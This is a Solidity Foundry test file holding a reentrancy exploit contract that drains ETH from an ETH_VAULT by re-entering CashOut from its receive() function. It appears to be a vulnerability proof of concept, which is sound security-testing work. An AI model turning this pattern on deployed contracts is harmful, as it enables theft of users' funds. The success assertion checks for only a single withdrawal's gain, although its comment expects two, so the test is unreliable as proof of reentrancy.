
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ETH_VAULT, Log} from "../src/ETH_VAULT_2.sol";

contract TestReentrancyETH_VAULT is Test {
    ETH_VAULT public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new ETH_VAULT(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        // Minimum deposit is 1 ether, so attackVal must be greater than 1 ether
        vm.assume(attackVal > 1 ether);
        vm.assume(attackVal <= 10 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // The attacker needs to have a balance in the vault first

        // --- 3. Funding ---
        // Fund the Victim contract so it has ETH to steal
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // Fund the Attacker contract
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ETH_VAULT public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = ETH_VAULT(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        // Deposit funds into the vault to establish a balance
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        // Capture Initial State - attacker's ETH balance before attack
        initialSnapshot = address(this).balance;
        
        // Store the value for the re-entrant call
        storedAttackVal = val;
        
        // Reset call count for the attack
        attackCallCount = 1;
        
        // Call the vulnerable CashOut function
        victim.CashOut(val);

        // Verify Success Conditions
        // If we received more than we should have (due to reentrancy), the attack succeeded
        // We should have received val twice (once from initial call, once from reentrant call)
        if (address(this).balance >= initialSnapshot + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            // Re-enter the CashOut function before the balance is updated
            victim.CashOut(storedAttackVal);
        }
    }
}
